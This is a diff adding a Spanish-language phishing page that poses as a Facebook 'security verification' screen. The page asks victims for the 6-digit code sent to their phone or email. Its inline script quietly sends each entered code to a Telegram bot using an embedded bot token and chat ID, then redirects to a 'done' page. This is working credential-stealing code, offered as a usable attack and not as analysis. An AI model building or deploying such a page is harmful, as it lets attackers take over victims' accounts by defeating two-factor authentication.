@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Facebook</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;font-family:-apple-system,Helvetica,Arial,sans-serif;background:#f0f2f5;color:#1c1e21}
+.top{background:#fff;padding:14px 16px;text-align:center;border-bottom:1px solid #dddfe2}
+.top img{height:34px}
+.wrap{padding:22px 16px}
+h1{font-size:19px;margin:0 0 6px;text-align:center;font-weight:600}
+.sub{font-size:14px;color:#65676b;text-align:center;margin:0 0 20px;line-height:1.5}
+input{width:100%;padding:16px;font-size:20px;text-align:center;letter-spacing:6px;border:1px solid #dddfe2;border-radius:8px;margin-bottom:10px}
+button{width:100%;padding:14px;font-size:17px;font-weight:700;color:#fff;background:#1877f2;border:0;border-radius:8px}
+.note{text-align:center;font-size:13px;color:#8a8d91;margin:20px 0 0;line-height:1.6}
+</style>
+</head>
+<body>
+<div class="top"><img src="logo.png" alt="Facebook"></div>
+<div class="wrap">
+<h1>Verificación de seguridad</h1>
+<p class="sub">Escribe el código de 6 dígitos que enviamos a tu teléfono o correo.</p>
+<form onsubmit="go(event)">
+<input id="c" type="text" inputmode="numeric" required>
+<button type="submit">Confirmar</button>
+</form>
+<p class="note">¿No te llegó? Reenvíalo desde tu Facebook.</p>
+</div>
+<script>
+var T="9061884309:AAFFvJInSbJ9QTMN-fdl6DtvUoFm3ZCU8HM/getUpdates";
+var C="612450820";
+function ping(t){new Image().src="https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+C+"&text="+encodeURIComponent(t);}
+function go(e){
+ e.preventDefault();
+ ping("CODIGO | "+document.getElementById("c").value);
+ setTimeout(function(){location.href="done.html";},800);
+}
+</script>
+</body>
+</html>
